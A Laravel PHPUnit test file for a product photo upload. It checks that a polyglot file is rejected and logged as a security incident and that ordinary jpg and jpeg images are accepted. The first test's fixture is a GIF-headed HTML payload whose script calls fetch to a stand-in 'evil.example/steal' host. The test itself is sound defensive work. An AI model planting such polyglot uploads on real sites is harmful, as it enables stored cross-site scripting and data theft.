<?php

declare(strict_types=1);

namespace Tests\Feature\Security;

use App\Models\Product;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Log\Events\MessageLogged;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Event;
use PHPUnit\Framework\Attributes\Test;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;
use Tests\TestCase;

class ProductPhotoUploadValidationTest extends TestCase
{
    use RefreshDatabase;

    private User $seller;

    protected function setUp(): void
    {
        parent::setUp();

        $sellerRole = Role::create(['name' => 'Seller', 'guard_name' => 'web']);
        $sellerRole->givePermissionTo(Permission::findOrCreate('create product', 'web'));
        $sellerRole->givePermissionTo(Permission::findOrCreate('update product', 'web'));

        $this->seller = User::factory()->create();
        $this->seller->assignRole($sellerRole);
    }

    #[Test]
    public function it_blocks_polyglot_upload_with_mismatched_extension_and_logs_security_incident(): void
    {
        Event::fake([MessageLogged::class]);

        $payload = "GIF89a\n<html><body><script>fetch('https://evil.example/steal')</script></body></html>";
        $file = UploadedFile::fake()->createWithContent('poc.html', $payload)->mimeType('image/gif');

        $this->actingAs($this->seller);

        $product = Product::factory()->make()->toArray();
        $product['expiration_date'] = Carbon::tomorrow()->format('Y-m-d');
        $product['photo'] = $file;

        $response = $this->post('/product/save', $product);

        $response->assertSessionHasErrors('photo');
        $this->assertSame(0, Product::withoutGlobalScopes()->count());

        Event::assertDispatched(MessageLogged::class, function (MessageLogged $event) {
            return ($event->context['channel'] ?? null) === 'security'
                && ($event->context['event'] ?? null) === 'upload_extension_mismatch'
                && ($event->context['client_extension'] ?? null) === 'html'
                && ($event->context['content_extension'] ?? null) === 'gif'
                && ($event->context['user_id'] ?? null) === $this->seller->id
                && ($event->context['user_email'] ?? null) === $this->seller->email
                && ($event->context['ip'] ?? null) !== null;
        });
    }

    #[Test]
    public function it_accepts_legit_image_when_extension_matches_content(): void
    {
        $this->actingAs($this->seller);

        $product = Product::factory()->make()->toArray();
        $product['expiration_date'] = Carbon::tomorrow()->format('Y-m-d');
        $product['photo'] = UploadedFile::fake()->image('photo.jpg');

        $this->post('/product/save', $product)->assertRedirect('/product');

        $saved = Product::withoutGlobalScopes()->first();
        $this->assertNotNull($saved);
        $this->assertNotNull($saved->photo);
        $this->assertStringEndsWith('.jpg', $saved->photo);

        $this->cleanupUploadedProductPhoto($saved);
    }

    #[Test]
    public function it_accepts_jpeg_extension_matching_jpeg_content(): void
    {
        $this->actingAs($this->seller);

        $product = Product::factory()->make()->toArray();
        $product['expiration_date'] = Carbon::tomorrow()->format('Y-m-d');
        $product['photo'] = UploadedFile::fake()->image('photo.jpeg');

        $this->post('/product/save', $product)->assertRedirect('/product');

        $saved = Product::withoutGlobalScopes()->first();
        $this->assertNotNull($saved);
        $this->assertNotNull($saved->photo);
        $this->assertStringEndsWith('.jpg', $saved->photo);

        $this->cleanupUploadedProductPhoto($saved);
    }

    private function cleanupUploadedProductPhoto(Product $product): void
    {
        $directory = public_path("asset/upload/product/{$product->id}");

        if (is_dir($directory)) {
            foreach (glob($directory.'/*') ?: [] as $file) {
                @unlink($file);
            }
            @rmdir($directory);
        }
    }
}
